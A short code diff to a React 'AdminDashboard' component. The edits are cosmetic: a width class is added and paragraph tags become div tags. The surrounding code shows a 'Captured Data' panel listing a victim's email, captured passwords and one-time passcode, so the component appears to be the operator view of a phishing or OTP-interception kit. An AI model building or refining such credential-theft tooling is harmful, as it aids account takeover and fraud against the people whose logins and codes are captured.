@@ -115,7 +115,7 @@ export function AdminDashboard() {
   };
 
   return (
-    <div className="max-w-7xl mx-auto grid gap-8 md:grid-cols-3">
+    <div className="max-w-7xl w-full mx-auto grid gap-8 md:grid-cols-3">
       <div className="md:col-span-1">
         <Card>
           <CardHeader>
@@ -186,22 +186,22 @@ export function AdminDashboard() {
               <h3 className="font-semibold mb-2">Captured Data</h3>
               <div className="space-y-4">
                 <div className="p-4 bg-muted rounded-lg">
-                  <p className="font-mono text-sm">
+                  <div className="font-mono text-sm">
                     <strong>Email:</strong> {state?.victim.email || "---"}
-                  </p>
+                  </div>
                 </div>
                 <div className="p-4 bg-muted rounded-lg space-y-2">
-                  <p className="font-mono text-sm"><strong>Passwords:</strong></p>
+                  <div className="font-mono text-sm"><strong>Passwords:</strong></div>
                   {state?.victim.passwords && state.victim.passwords.length > 0 ? (
                     <ul className="list-disc list-inside space-y-1">
                       {state.victim.passwords.map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
                     </ul>
-                  ) : <p className="font-mono text-sm">---</p>}
+                  ) : <div className="font-mono text-sm">---</div>}
                 </div>
                  <div className="p-4 bg-muted rounded-lg">
-                  <p className="font-mono text-sm">
+                  <div className="font-mono text-sm">
                     <strong>OTP:</strong> {state?.victim.otp || "---"}
-                  </p>
+                  </div>
                 </div>
               </div>
             </div>
